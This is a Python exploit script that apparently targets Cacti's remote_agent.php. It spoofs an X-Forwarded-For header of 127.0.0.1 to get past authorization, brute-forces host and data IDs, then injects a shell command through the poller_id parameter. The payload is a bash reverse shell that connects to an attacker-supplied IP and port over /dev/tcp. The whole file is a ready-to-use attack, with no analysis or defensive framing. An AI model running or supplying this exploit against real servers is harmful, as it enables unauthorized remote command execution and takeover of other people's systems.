import requests
import urllib.parse

def checkVuln():
    result = requests.get(vulnURL, headers=header)
    return (result.text != "FATAL: You are not authorized to use this service" and result.status_code == 200)

def bruteForce():
    for i in range(1, 5):
        for j in range(1, 10):
            vulnIdURL = f"{vulnURL}?action=polldata&poller_id=1&host_id={i}&local_data_ids[]={j}"
            result = requests.get(vulnIdURL, headers=header)

            if result.text != "[]":
                # print(result.text)
                rrdName = result.json()[0]["rrd_name"]
                if rrdName == "polling_time" or rrdName == "uptime":
                    return True, i, j

    return False, -1, -1


def remoteCodeExecution(payload, idHost, idLocal):
    encodedPayload = urllib.parse.quote(payload)
    injectedURL = f"{vulnURL}?action=polldata&poller_id=;{encodedPayload}&host_id={idHost}&local_data_ids[]={idLocal}"

    result = requests.get(injectedURL,headers=header)
    print(result.text)

if __name__ == "__main__":
    targetURL = input("URL: ")
    vulnURL = f"{targetURL}/remote_agent.php"
    header = {"X-Forwarded-For": "127.0.0.1"}
    print("Checking vulnerability...")
    if checkVuln():
        print("App is vulnerable")
        isVuln, idHost, idLocal = bruteForce()
        print("Brute forcing id...")
        # RCE payload
        ipAddress = input("IP: ")
        port = input("Port: ")
        payload = f"bash -c 'bash -i >& /dev/tcp/{ipAddress}/{port} 0>&1'"
        if isVuln:
            print("Delivering payload...")
            remoteCodeExecution(payload, idHost, idLocal)
        else:
            print("RRD not found")
    else:
        print("Not vulnerable")
